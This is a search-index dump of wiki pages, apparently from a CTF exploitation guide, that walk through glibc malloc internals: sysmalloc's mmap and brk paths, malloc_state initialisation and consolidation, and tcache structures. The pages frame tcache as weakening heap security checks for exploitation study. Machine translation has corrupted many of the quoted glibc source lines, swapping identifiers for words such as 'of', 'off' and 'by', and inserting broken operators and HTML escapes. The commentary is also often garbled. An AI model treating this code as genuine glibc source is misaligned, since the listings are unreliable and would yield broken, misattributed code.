/* No limit.  */\n#endif\n};\n</code></pre> <p><code>DEFAULT_MMAP_THRESHOLD</code> is 128*1024 bytes, or 128 K.</p> <pre><code>#ifndef DEFAULT_MMAP_THRESHOLD\n#define DEFAULT_MMAP_THRESHOLD DEFAULT_MMAP_THRESHOLD_MIN\n#endif\n/*\n  MMAP_THRESHOLD_MAX and _MIN are the bounds on the dynamically\n  adjusted MMAP_THRESHOLD.\n*/\n\n#ifndef DEFAULT_MMAP_THRESHOLD_MIN\n#define DEFAULT_MMAP_THRESHOLD_MIN (128 * 1024)\n#endif\n\n#ifndef DEFAULT_MMAP_THRESHOLD_MAX\n/* For 32-bit platforms we cannot increase the maximum mmap\n   threshold much because it is also the minimum value for the\n   maximum heap size and its alignment.  Going above 512k (i.e., 1M\n   for new heaps) wastes too much address space.  */\n#if __WORDSIZE == 32\n#define DEFAULT_MMAP_THRESHOLD_MAX (512 * 1024)\n#else\n#define DEFAULT_MMAP_THRESHOLD_MAX (4 * 1024 * 1024 * sizeof(long))\n#endif\n#endif\n</code></pre> <p>The following is part of the code, which is not the focus of our concern at present, and can be skipped temporarily.</p> <pre><code>  /*\n     If have mmap, and the request size meets the mmap threshold, and\n     the system supports mmap, and there are few enough currently\n     allocated mmapped regions, try to directly map this request\n     rather than expanding top.\n   */\n\nif (av == NULL ||\n      ((unsigned long)(nb) &gt;= (unsigned long)(mp_.mmap_threshold) &amp;&amp;\n      (mp_.n_mmaps &lt;mp_.n_mmaps_max)) {\n    char *mm; /* return value from mmap call*/\n\n  try_mmap:\n    /*\n       Round up size to nearest page.  For mmapped chunks, the overhead\n       is one SIZE_SZ unit larger than for normal chunks, because there\n       is no following chunk whose prev_size field could be used.\n\n       See the front_misalign handling below, for glibc there is no\n       need for further alignments unless we have have high alignment.\n     */\n    if (MALLOC_ALIGNMENT == 2 * SIZE_SZ)\n      size = ALIGN_UP(nb + SIZE_SZ, pagesize);\n    else\n      size = ALIGN_UP(nb + SIZE_SZ + MALLOC_ALIGN_MASK, pagesize);\n    tried_mmap = true;\n\n    /* Don't try if size wraps around 0 */\n    if ((unsigned long)(size) &gt; (unsigned long)(nb)) {\n      mm = (char *)(MMAP(0, size, PROT_READ | PROT_WRITE, 0));\n\n      if (mm != MAP_FAILED) {\n        /*\n           The offset to the start of the mmapped region is stored\n           in the prev_size field of the chunk. This allows us to adjust\n           returned start address to meet alignment requirements here\n           and in memalign(), and still be able to compute proper\n           address argument for later munmap in free() and realloc().\n         */\n\n        if (MALLOC_ALIGNMENT == 2 * SIZE_SZ) {\n          /* For glibc, chunk2mem increases the address by 2*SIZE_SZ and\n             MALLOC_ALIGN_MASK is 2*SIZE_SZ-1.  Each mmap'ed area is page\n             aligned and therefore definitely MALLOC_ALIGN_MASK-aligned.  */\n          assert(((INTERNAL_SIZE_T)chunk2mem(mm) &amp; MALLOC_ALIGN_MASK) == 0);\n          front_misalign = 0;\n        } else\n          front_misalign = (INTERNAL_SIZE_T)chunk2mem(mm) &amp; MALLOC_ALIGN_MASK;\n        if (front_misalign &gt; 0) {\n          correction = MALLOC_ALIGNMENT - front_misalign;\n          p = (mchunkptr)(mm + correction);\n          set_prev_size(p, correction);\n          set_head(p, (size - correction) | IS_MMAPPED);\n        } else {\n          p = (mchunkptr)mm;\n          set_prev_size(p, 0);\n          set_head(p, size | IS_MMAPPED);\n        }\n\n        /* update statistics */\n\n        int new = atomic_exchange_and_add(&amp;mp_.n_mmaps, 1) + 1;\n        atomic_max(&amp;mp_.max_n_mmaps, new);\n\n        unsigned long sum;\n        sum = atomic_exchange_and_add(&amp;mp_.mmapped_mem, size) + size;\n        atomic_max(&amp;mp_.max_mmapped_mem, sum);\n\n        check_chunk(av, p);\n\n        return chunk2mem(p);\n      }\n    }\n  }\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#mmap-failed-or-unallocated-heap","title":"mmap failed or unallocated heap","text":"<pre><code>  /* There are no usable arenas and mmap also failed.  */\n  if (av == NULL)\n    return 0;\n</code></pre> <p>If it is any of these two situations, you can actually quit. .</p>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#recording-old-heap-information","title":"Recording old heap information","text":"<pre><code>  /* Record incoming configuration of top */\n  old_top = av-&gt;top;\n  old_size = chunksize(old_top);\n  old_end = (char *)(chunk_at_offset(old_top, old_size));\n\n  brk = snd_brk = (char *)(MORECORE_FAILURE);\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#check-old-heap-information-1","title":"Check old heap information 1","text":"<pre><code>  /*\n     If not the first time through, we require old_size to be\n     at least MINSIZE and to have prev_inuse set.\n   */\n\n  assert((old_top == initial_top(av) &amp;&amp; old_size == 0) ||\n         ((unsigned long)(old_size) &gt;= MINSIZE &amp;&amp; prev_inuse(old_top) &amp;&amp;\n          ((unsigned long)old_end &amp; (pagesize - 1)) == 0));\n</code></pre> <p>This check requires that any one of the conditions be met</p> <ol> <li><code>old_top == initial_top(av) &amp;&amp; old_size == 0</code>, ie if it is the first time, the heap size needs to be 0.</li> <li>The new heap, then</li> <li><code>(unsigned long)(old_size) &gt;= MINSIZE &amp;&amp; prev_inuse(old_top)</code>, the heap size should be no smaller than <code>MINSIZE</code>, and the previous heap block should be in use.</li> <li><code>((unsigned long)old_end &amp;(pagesize - 1)) == 0)</code>, the end address of the heap should be page-aligned. Since the page alignment size defaults to 0x1000, the lower 12 bits need to be 0.</li> </ol>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#check-old-heap-information-2","title":"Check old heap information 2","text":"<pre><code>  /* Precondition: not enough current space to satisfy nb request */\n  assert((unsigned long)(old_size) &lt; (unsigned long)(nb + MINSIZE));\n</code></pre> <p>According to the definition in malloc</p> <pre><code>static void *_int_malloc(mstate av, size_t bytes) {\n    INTERNAL_SIZE_T nb;  /* normalized request size */\n</code></pre> <p><code>nb</code> should be the byte that has been added to the chunk header. Why add <code>MINSIZE</code>? This is because the size of the top chunk should at least reserve the MINSIZE space for easy merging.</p>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#non-main_arena","title":"Non main_arena","text":"<p>This is not the focus of care for the time being, and it will not be analyzed for the time being.</p> <pre><code>  if (av! = &amp;main_arena) {\n    heap_info *old_heap, *heap;\n    size_t old_heap_size;\n\n    /* First try to extend the current heap. */\n    old_heap = heap_for_ptr(old_top);\n    old_heap_size = old_heap-&gt;size;\n    if ((long)(MINSIZE + nb - old_size) &gt; 0 &amp;&amp;\n        grow_heap(old_heap, MINSIZE + nb - old_size) == 0) {\n      av-&gt;system_mem += old_heap-&gt;size - old_heap_size;\n      set_head(old_top,\n               (((char *)old_heap + old_heap-&gt;size) - (char *)old_top) |\n                   PREV_INUSE);\n    } else if ((heap = new_heap(nb + (MINSIZE + sizeof(*heap)), mp_.top_pad))) {\n      /* Use a newly allocated heap.  */\n      heap-&gt;ar_ptr = av;\n      heap-&gt;prev = old_heap;\n      av-&gt;system_mem + = heap-&gt;size;\n      /* Set up the new top.  */\n      top(av) = chunk_at_offset(heap, sizeof(*heap));\n      set_head(top(av), (heap-&gt;size - sizeof(*heap)) | PREV_INUSE);\n\n      /* Setup fencepost and free the old top chunk with a multiple of\n         MALLOC_ALIGNMENT in size. */\n      /* The fencepost takes at least MINSIZE bytes, because it might\n         become the top chunk again later.  Note that a footer is set\n         up, too, although the chunk is marked in use. */\n      old_size = (old_size - MINSIZE) &amp; ~MALLOC_ALIGN_MASK;\n      set_head(chunk_at_offset(old_top, old_size + 2 * SIZE_SZ),\n               0 | PREV_INUSE);\n      if (old_size &gt;= MINSIZE) {\n        set_head(chunk_at_offset(old_top, old_size),\n                 (2 * SIZE_SZ) | PREV_INUSE);\n        set_foot(chunk_at_offset(old_top, old_size), (2 * SIZE_SZ));\n        set_head(old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);\n        _int_free(av, old_top, 1);\n      } else {\n        set_head(old_top, (old_size + 2 * SIZE_SZ) | PREV_INUSE);\n        set_foot(old_top, (old_size + 2 * SIZE_SZ));\n      }\n    } else if (!tried_mmap)\n      /* We can at least try to use to mmap memory.  */\n      goto try_mmap;\n  }\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#main_arena-processing","title":"Main_arena Processing","text":""},{"location":"pwn/linux/glibc-heap/implementation/malloc/#calculating-memory","title":"Calculating memory","text":"<p>The calculation can satisfy the requested memory size.</p> <pre><code>else {/ * by == main_arena * /\n\n    /* Request enough space for nb + pad + overhead */\n    size = nb + mp_.top_pad + MINSIZE;\n</code></pre> <p>By default <code>top_pad</code> is defined as</p> <pre><code>#ifndef DEFAULT_TOP_PAD\n# define DEFAULT_TOP_PAD 131072\n#endif\n</code></pre> <p>That is, 131072 bytes, 0x20000 bytes.</p>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#whether-it-is-continuous","title":"Whether it is continuous","text":"<p>If we want the heap space to be continuous, then we can actually reuse the previous memory.</p> <pre><code>    /*\n       If contiguous, we can subtract out existing space that we hope to\n       combine with new space. We add it back later only if\n       we don't actually get contiguous space.\n     */\n\n    if (contiguous(av))\n      size -= old_size;\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#align-page-size","title":"Align page size","text":"<pre><code>    /*\n       Round to a multiple of page size.\n       If MORECORE is not contiguous, this ensures that we only call it\n       with whole-page arguments.  And if MORECORE is contiguous and\n       this is not first time through, this preserves page-alignment of\n       previous calls. Otherwise, we correct to page-align below.\n\n     */\n\n    size = ALIGN_UP(size, pagesize);\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#applying-for-memory","title":"Applying for memory","text":"<pre><code>    /*\n       Don't try to call MORECORE if argument is so big as to appear\n       negative. Note that since mmap takes size_t arg, it may succeed\n       below even if we cannot call MORECORE.\n     */\n\n    if (size &gt; 0) {\n      brk = (char *)(MORECORE(size));\n      LIBC_PROBE(memory_sbrk_more, 2, brk, size);\n    }\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#may-succeed","title":"May succeed","text":"<pre><code>    if (brk != (char *)(MORECORE_FAILURE)) {\n      /* Call the `morecore' hook if necessary.  */\n      void (*hook)(void) = atomic_forced_read(__after_morecore_hook);\n      if (__builtin_expect(hook != NULL, 0))\n        (*hook)();\n    }\n</code></pre> <p>It is a bit of a meaning to call a hook here.</p>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#failed","title":"Failed","text":"<p>Failure, consider mmap.</p> <pre><code>else {\n      /*\n         If have mmap, try using it as a backup when MORECORE fails or\n         cannot be used. This is worth doing on systems that have \"holes\" in\n         address space, so sbrk cannot extend to give contiguous space, but\n         space is available elsewhere.  Note that we ignore mmap max count\n         and threshold limits, since the space will not be used as a\n         segregated mmap region.\n       */\n\n      /* Cannot merge with old top, so add its size back in */\n      if (contiguous(av))\n        size = ALIGN_UP(size + old_size, pagesize);\n\n      /* If we are relying on mmap as backup, then use larger units */\n      if ((unsigned long)(size) &lt; (unsigned long)(MMAP_AS_MORECORE_SIZE))\n        size = MMAP_AS_MORECORE_SIZE;\n\n      /* Don't try if size wraps around 0 */\n      if ((unsigned long)(size) &gt; (unsigned long)(nb)) {\n        char *mbrk = (char *)(MMAP(0, size, PROT_READ | PROT_WRITE, 0));\n\n        if (mbrk != MAP_FAILED) {\n          /* We do not need, and cannot use, another sbrk call to find end */\n          brk = mbrk;\n          snd_brk = brk + size;\n\n          /*\n             Record that we no longer have a contiguous sbrk region.\n             After the first time mmap is used as backup, we do not\n             ever rely on contiguous space since this could incorrectly\n             bridge regions.\n           */\n\n          set_noncontiguous(av);\n        }\n\n      }\n\n    }\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#memory-may-be-applied-successfully","title":"Memory may be applied successfully","text":"<pre><code>    if (brk != (char *)(MORECORE_FAILURE)) {\n      if (mp_.sbrk_base == 0)\n        mp_srk_base = brk;\n        av-&gt;system_mem + = size;\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#situation-1","title":"Situation 1","text":"<pre><code>      /*\n         If MORECORE extends previous space, we can likewise extend top size.\n       */\n\n      if (brk == old_end &amp;&amp; snd_brk == (char *)(MORECORE_FAILURE))\n        set_head(old_top, (size + old_size) | PREV_INUSE);\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#case-2-unexpected-memory-exhaustion","title":"Case 2 - Unexpected memory exhaustion","text":"<pre><code>      else if (contiguous(av) &amp;&amp; old_size &amp;&amp; brk &lt; old_end)\n        /* Oops!  Someone else killed our space..  Can't touch anything.  */\n        malloc_printerr(\"break adjusted to free malloc space\");\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#handling-other-unexpected-situations","title":"Handling other unexpected situations","text":"<pre><code>      /*\n         Otherwise, make adjustments:\n\n       * If the first time through or noncontiguous, we need to call sbrk\n          just to find out where the end of memory lies.\n\n       * We need to ensure that all returned chunks from malloc will meet\n          MALLOC_ALIGNMENT\n\n       * If there was an intervening foreign sbrk, we need to adjust sbrk\n          request size to account for fact that we will not be able to\n          combine new space with existing space in old_top.\n\n       * Almost all systems internally allocate whole pages at a time, in\n          which case we might as well use the whole last page of request.\n          So we allocate enough more memory to hit a page boundary now,\n          which in turn causes future contiguous calls to page-align.\n       */\n\n      else {\n        front_misalign = 0;\n        end_misalign = 0;\n        correction = 0;\n        aligned_brk = brk;\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#processing-contiguous-memory","title":"Processing contiguous memory","text":"<pre><code>        /* handle contiguous cases */\n        if (contiguous(av)) {\n          /* Count foreign sbrk as system_mem.  */\n          if (old_size)\n            av-&gt;system_mem + = brk - old_end;\n\n          /* Guarantee alignment of first new chunk made from this space */\n\n          front_misalign = (INTERNAL_SIZE_T)chunk2mem(brk) &amp; MALLOC_ALIGN_MASK;\n          if (front_misalign &gt; 0) {\n            /*\n               Skip over some bytes to arrive at an aligned position.\n               We don't need to specially mark these wasted front bytes.\n               They will never be accessed anyway because\n               prev_inuse of av-&gt;top (and any chunk created from its start)\n               is always true after initialization.\n             */\n\n            correction = MALLOC_ALIGNMENT - front_misalign;\n            aligned_brk += correction;\n          }\n          /*\n             If this isn't adjacent to existing space, then we will not\n             be able to merge with old_top space, so must add to 2nd request.\n           */\n\n          correction += old_size;\n\n          /* Extend the end address to hit a page boundary */\n          end_misalign = (INTERNAL_SIZE_T)(brk + size + correction);\n          correction += (ALIGN_UP(end_misalign, pagesize)) - end_misalign;\n\n          assert(correction &gt;= 0);\n          snd_brk = (char *)(MORECORE(correction));\n\n          /*\n             If can't allocate correction, try to at least find out current\n             brk.  It might be enough to proceed without failing.\n\n             Note that if second sbrk did NOT fail, we assume that space\n             is contiguous with first sbrk. This is a safe assumption unless\n             program is multithreaded but doesn't use locks and a foreign sbrk\n             occurred between our first and second calls.\n           */\n\n          if (snd_brk == (char *)(MORECORE_FAILURE)) {\n            correction = 0;\n            snd_brk = (char *) (MORECORE(0));\n          } else {\n            /* Call the `morecore' hook if necessary.  */\n            void (*hook)(void) = atomic_forced_read(__after_morecore_hook);\n            if (__builtin_expect(hook != NULL, 0))\n              (*hook)();\n          }\n        }\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#handling-discontinuous-memory","title":"Handling discontinuous memory","text":"<pre><code>        /* handle non-contiguous cases */\n        else {\n          if (MALLOC_ALIGNMENT == 2 * SIZE_SZ)\n            /* MORECORE/mmap must correctly align */\n            assert(((unsigned long)chunk2mem(brk) &amp; MALLOC_ALIGN_MASK) == 0);\n          else {\n            front_misalign =\n                (INTERNAL_SIZE_T)chunk2mem(brk) &amp; MALLOC_ALIGN_MASK;\n            if (front_misalign &gt; 0) {\n              /*\n                 Skip over some bytes to arrive at an aligned position.\n                 We don't need to specially mark these wasted front bytes.\n                 They will never be accessed anyway because\n                 prev_inuse of av-&gt;top (and any chunk created from its start)\n                 is always true after initialization.\n               */\n\n              aligned_brk += MALLOC_ALIGNMENT - front_misalign;\n            }\n          }\n\n          /* Find out current end of memory */\n          if (snd_brk == (char *)(MORECORE_FAILURE)) {\n            snd_brk = (char *) (MORECORE(0));\n          }\n        }\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#adjustment","title":"Adjustment","text":"<pre><code>        /* Adjust top based on results of second sbrk */\n        if (snd_brk != (char *)(MORECORE_FAILURE)) {\n          av-&gt;top = (mchunkptr) aligned_brk;\n          set_head(av-&gt;top, (snd_brk - aligned_brk + correction) | PREV_INUSE);\n          av-&gt;system_mem + = correction;\n\n          /*\n             If not the first time through, we either have a\n             gap due to foreign sbrk or a non-contiguous region.  Insert a\n             double fencepost at old_top to prevent consolidation with space\n             we don't own. These fenceposts are artificial chunks that are\n             marked as inuse and are in any case too small to use.  We need\n             two to make sizes and alignments work out.\n           */\n\n          if (old_size != 0) {\n            /*\n               Shrink old_top to insert fenceposts, keeping size a\n               multiple of MALLOC_ALIGNMENT. We know there is at least\n               enough space in old_top to do this.\n             */\n            old_size = (old_size - 4 * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;\n            set_head(old_top, old_size | PREV_INUSE);\n\n            /*\n               Note that the following assignments completely overwrite\n               old_top when old_size was previously MINSIZE.  This is\n               intentional. We need the fencepost, even if old_top otherwise\n               gets lost.\n             */\n            set_head(chunk_at_offset(old_top, old_size),\n                     (2 * SIZE_SZ) | PREV_INUSE);\n            set_head(chunk_at_offset(old_top, old_size + 2 * SIZE_SZ),\n                     (2 * SIZE_SZ) | PREV_INUSE);\n\n            /* If possible, release the rest. */\n            if (old_size &gt;= MINSIZE) {\n              _int_free(av, old_top, 1);\n            }\n          }\n        }\n      }\n</code></pre> <p>It should be noted that here the program releases the old top chunk, and it will enter different bins or tcaches depending on the size.</p>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#update-maximum-memory","title":"Update maximum memory","text":"<pre><code>  if ((unsigned long) av-&gt;system_mem &gt; (unsigned long) (av-&gt;max_system_mem))\n    av-&gt;max_system_mem = av-&gt;system_mem;\n  check_malloc_state(av);\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#allocating-memory-blocks","title":"Allocating memory blocks","text":""},{"location":"pwn/linux/glibc-heap/implementation/malloc/#get-the-size","title":"Get the size","text":"<pre><code>  /* finally, do the allocation */\n  p = av-&gt;top;\n  size = chunksize(p);\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#top","title":"\u5207\u5206 top","text":"<pre><code>  /* check that one of the above allocation paths succeeded */\n  if ((unsigned long)(size) &gt;= (unsigned long)(nb + MINSIZE)) {\n    remainder_size = size - nb;\n    remainder = chunk_at_offset(p, nb);\n    av-&gt;top = remainder;\n    set_head(p, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0));\n    set_head(remainder, remainder_size | PREV_INUSE);\n    check_malloced_chunk(av, p, nb);\n    return chunk2mem(p);\n  }\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc/#capture-all-errors","title":"Capture all errors","text":"<pre><code>  /* catch all failure paths */\n  __set_errno(ENOMEM);\n  return 0;\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc_state/","title":"malloc_state Related Functions","text":""},{"location":"pwn/linux/glibc-heap/implementation/malloc_state/#malloc_init_state","title":"malloc_init_state","text":"<pre><code>/*\n\n   Initialize a malloc_state struct.\n\n   This is called only from within malloc_consolidate, which needs\n\n   be called in the same contexts anyway.  It is never called directly\n\n   outside of malloc_consolidate because some optimizing compilers try\n\n   to inline it at all call points, which turns out not to be an\n\n   optimization at all. (Inlining it in malloc_consolidate is fine though.)\n\n */\n\n\n\nstatic void malloc_init_state(mstate av) {\n\n    int     i;\n\nmbinptr bin;\n\n\n    /* Establish circular links for normal bins */\n\n    for (i = 1; i &lt; NBINS; ++i) {\n\nbin = bin_at (av, i);\nbin-&amp;gt; fd = bin-&amp;gt; bk = bin;\n    }\n\n\n\n#if MORECORE_CONTIGUOUS\n\nif (by! = &amp;amp; main_arena)\n#endif\nset_noncontiguous (of);\n    if (av == &amp;main_arena) set_max_fast(DEFAULT_MXFAST);\n\n/ / Set the flags flag does not currently have fast chunk\noff-&amp;gt; flags | = FASTCHUNKS_BIT;\n// is unsorted bin\noff-&amp;gt; top = initial_top (off);\n}\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc_state/#malloc_consolidate","title":"malloc_consolidate","text":"<p>This function has two main functions.</p> <ol> <li>If fastbin is not initialized, ie global_max_fast is 0, initialize malloc_state.</li> <li>If it has already been initialized, merge the chunks in fastbin.</li> </ol> <p>The basic process is as follows</p>"},{"location":"pwn/linux/glibc-heap/implementation/malloc_state/#initial","title":"Initial","text":"<pre><code>static void malloc_consolidate(mstate av) {\n\n    mfastbinptr *fb;             /* current fastbin being consolidated */\n\n    mfastbinptr *maxfb;          /* last fastbin (for loop control) */\n\n    mchunkptr    p;              /* current chunk being consolidated */\n\n    mchunkptr    nextp;          /* next chunk to consolidate */\n\n    mchunkptr    unsorted_bin;   /* bin header */\n\n    mchunkptr    first_unsorted; /* chunk to link to */\n\n\n\n    /* These have same use as in free() */\n\n    mchunkptr       nextchunk;\n\n    INTERNAL_SIZE_T size;\n\n    INTERNAL_SIZE_T nextsize;\n\n    INTERNAL_SIZE_T prevsize;\n\nint nextinuse;\n    mchunkptr       bck;\n\n    mchunkptr       fwd;\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc_state/#merge-chunk","title":"Merge chunk","text":"<pre><code>    /*\n\n      If max_fast is 0, we know that av hasn't\n\n      yet been initialized, in which case do so below\n\n    */\n\n// Description fastbin has been initialized\n    if (get_max_fast() != 0) {\n\n// empty the fastbin tag\n// Because I want to merge the chunks in fastbin.\nclear_fastchunks (of);\n        //\n\nunsorted_bin = unsorted_chunks (off);\n\n\n        /*\n\n          Remove each chunk from fast bin and consolidate it, placing it\n\n          then in unsorted bin. Among other reasons for doing this,\n\n          placing in unsorted bin avoids needing to calculate actual bins\n\n          until malloc is sure that chunks aren't immediately going to be\n\n          reused anyway.\n\n        */\n\n// Traverse each bin of fastbin in fd order, merging each chunk in the bin.\nmaxfb = &amp;amp; fastbin (off, NFASTBINS - 1);\nfb = &amp;amp; fastbin (av, 0);\n        do {\n\n            p = atomic_exchange_acq(fb, NULL);\n\n            if (p != 0) {\n\n                do {\n\n                    check_inuse_chunk(av, p);\n\n                    nextp = p-&gt;fd;\n\n\n\n                    /* Slightly streamlined version of consolidation code in\n\n                     * free() */\n\n                    size      = chunksize(p);\n\n                    nextchunk = chunk_at_offset(p, size);\n\n                    nextsize  = chunksize(nextchunk);\n\n\n\n                    if (!prev_inuse(p)) {\n\n                        prevsize = prev_size(p);\n\n                        size += prevsize;\n\n                        p = chunk_at_offset(p, -((long) prevsize));\n\nunlink (off, p, bck, fwd);\n                    }\n\n\n\n                    if (nextchunk != av-&gt;top) {\n\n// Determine if nextchunk is free.\n                        nextinuse = inuse_bit_at_offset(nextchunk, nextsize);\n\n\n\n                        if (!nextinuse) {\n\n                            size += nextsize;\n\n                            unlink(av, nextchunk, bck, fwd);\n\n                        } else\n\n// Set the prev inuse of nextchunk to 0 to indicate that the current fast chunk can be merged.\n                            clear_inuse_bit_at_offset(nextchunk, 0);\n\n\n\n                        first_unsorted     = unsorted_bin-&gt;fd;\n\n                        unsorted_bin-&gt;fd   = p;\n\n                        first_unsorted-&gt;bk = p;\n\n\n                        if (!in_smallbin_range(size)) {\n\n                            p-&gt;fd_nextsize = NULL;\n\n                            p-&gt;bk_nextsize = NULL;\n\n                        }\n\n\n\n                        set_head(p, size | PREV_INUSE);\n\n                        p-&gt;bk = unsorted_bin;\n\n                        p-&gt;fd = first_unsorted;\n\n                        set_foot(p, size);\n\n                    }\n\n\n\n                    else {\n\n                        size += nextsize;\n\n                        set_head(p, size | PREV_INUSE);\n\nof -&amp;gt; top = p;\n                    }\n\n\n\n                } while ((p = nextp) != 0);\n\n            }\n\n        } while (fb++ != maxfb);\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/malloc_state/#initialization","title":"Initialization","text":"<p>Note that fastbin has not been initialized yet.</p> <pre><code>    } else {\n\nmalloc_init_state (of);\n// It&amp;#39;s useless in non-debug situations. In the case of debugging, do some testing.\ncheck_malloc_state (of);\n    }\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/misc/","title":"\u6d4b\u8bd5\u652f\u6301","text":"<p>The following code is used to support testing. Perturb_byte is 0 by default.</p> <pre><code>static int perturb_byte;\n\n\n\nstatic void alloc_perturb(char *p, size_t n) {\n\n    if (__glibc_unlikely(perturb_byte)) memset(p, perturb_byte ^ 0xff, n);\n\n}\n\n\n\nstatic void free_perturb(char *p, size_t n) {\n\n    if (__glibc_unlikely(perturb_byte)) memset(p, perturb_byte, n);\n\n}\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/overview/","title":"Deep understanding of heap implementation","text":"<p>Think about it carefully, any heap implementation needs to consider the corresponding problem from the following two perspectives.</p> <ul> <li>Macro perspective</li> <li>Create a heap</li> <li>heap initialization</li> <li>Delete heap</li> <li>Micro angle</li> <li>Apply for a memory block</li> <li>Free memory block</li> </ul> <p>Of course, these are relatively high-level ideas, and the underlying implementation of different heaps will be different.</p>"},{"location":"pwn/linux/glibc-heap/implementation/tcache/","title":"tcache","text":"<p>Tcache is a technique introduced after glibc 2.26 (ubuntu 17.10) (see commit), the purpose is to improve The performance of heap management. But while improving performance, it has abandoned a lot of security checks, so there are many new ways to use it.</p> <p>&gt; Mainly refer to the glibc source code, angelboy's slide and tukan.farm, the links are all at the end.</p>"},{"location":"pwn/linux/glibc-heap/implementation/tcache/#related-structure","title":"Related Structure","text":"<p>Tcache introduces two new structures, <code>tcache_entry</code> and <code>tcache_perthread_struct</code>.</p> <p>This is actually very similar to fastbin, but it is different.</p>"},{"location":"pwn/linux/glibc-heap/implementation/tcache/#tcache_entry","title":"tcache_entry","text":"<p>source code</p> <pre><code>/* We overlay this structure on the user-data portion of a chunk when\n\n   the chunk is stored in the per-thread cache.  */\n\ntypedef struct tcache_entry\n\n{\n\n  struct tcache_entry *next;\n\n} tcache_entry;\n</code></pre> <p><code>tcache_entry</code> is used to link free chunk structures, where the <code>next</code> pointer points to the next chunk of the same size.</p> <p>Note that the next here points to the user data of the chunk, and the fd of the fastbin points to the address at the beginning of the chunk.</p> <p>Moreover, tcache_entry multiplexes the user data portion of the free chunk.</p>"},{"location":"pwn/linux/glibc-heap/implementation/tcache/#tcache_perthread_struct","title":"tcache_perthread_struct","text":"<p>source code</p> <pre><code>/* There is one of these for each thread, which contains the\n\n   per-thread cache (hence \"tcache_perthread_struct\").  Keeping\n\n   overall size low is mildly important.  Note that COUNTS and ENTRIES\n\n   are redundant (we could have just counted the linked list each\n\n   time), this is for performance reasons.  */\n\ntypedef struct tcache_perthread_struct\n\n{\n\n  char counts[TCACHE_MAX_BINS];\n\n  tcache_entry *entries[TCACHE_MAX_BINS];\n\n} tcache_perthread_struct;\n\n\n\n# define TCACHE_MAX_BINS                64\n\n\n\nstatic __thread tcache_perthread_struct *tcache = NULL;\n</code></pre> <p>Each thread maintains a <code>tcache_prethread_struct</code>, which is the management structure of the entire tcache. There are a total of <code>TCACHE_MAX_BINS</code> counters and a <code>TCACHE_MAX_BINS</code> entry tcache_entry.</p> <ul> <li><code>tcache_entry</code> links the same size of free (after free) chunks in a singly linked list, much like fastbin.</li> <li><code>counts</code> records the number of free chunks in the <code>tcache_entry</code> chain, with up to 7 chunks per chain.</li> </ul> <p>The diagram is probably:</p> <p></p>"},{"location":"pwn/linux/glibc-heap/implementation/tcache/#basic-working-methods","title":"Basic working methods","text":"<ul> <li>The first malloc will first malloc a block of memory for <code>tcache_prethread_struct</code>.</li> <li>free memory, and size is less than small bin size</li> <li>tcache will be placed in fastbin or unsorted bin before</li> <li>after tcache:</li> <li>Put it in the corresponding tcache until tcache is filled (the default is 7)</li> <li>After tcache is filled, the free memory is placed in fastbin or unsorted bin as before.</li> <li>chunks in tcache are not merged (do not cancel inuse bit)</li> <li>malloc memory, and size is in the tcache range</li> <li>First take chunk from tcache until tcache is empty</li> <li>After tcache is empty, look for it from bin</li> <li>When tcache is empty, if there is a chunk with size matching in <code>fastbin/smallbin/unsorted bin</code>, the chunk in <code>fastbin/smallbin/unsorted bin</code> will be put into tcache first until it is full. Then take it from tcache; therefore the order of chunks in bin and tcache will be reversed.</li> </ul>"},{"location":"pwn/linux/glibc-heap/implementation/tcache/#source-analysis","title":"Source Analysis","text":"<p>Next, analyze tcache from the perspective of source code.</p>"},{"location":"pwn/linux/glibc-heap/implementation/tcache/#__libc_malloc","title":"__libc_malloc","text":"<p>The first time malloc will enter <code>MAYBE_INIT_TCACHE ()</code></p> <p>source code</p> <pre><code>void *\n\n__libc_malloc (size_t bytes)\n\n{\n\n    ......\n\n    ......\n\n#if USE_TCACHE\n\n  /* int_free also calls request2size, be careful to not pad twice.  */\n\n  size_t tbytes;\n\n/ / Calculate the actual size of the chunk according to the parameters passed in malloc, and calculate the subscript corresponding to tcache\n  checked_request2size (bytes, tbytes);\n\n  size_t tc_idx = csize2tidx (tbytes);\n\n\n\n/ / Initialize tcache\n  MAYBE_INIT_TCACHE ();\n\n  DIAG_PUSH_NEEDS_COMMENT;\n\nIf (tc_idx &amp;lt; mp_.tcache_bins // The idx obtained from size is within the legal range\n      /*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */\n\n      &amp;&amp; tcache\n\n      &amp;&amp; tcache-&gt;entries[tc_idx] != NULL) // tcache-&gt;entries[tc_idx] \u6709 chunk\n\n    {\n\n      return tcache_get (tc_idx);\n\n    }\n\n  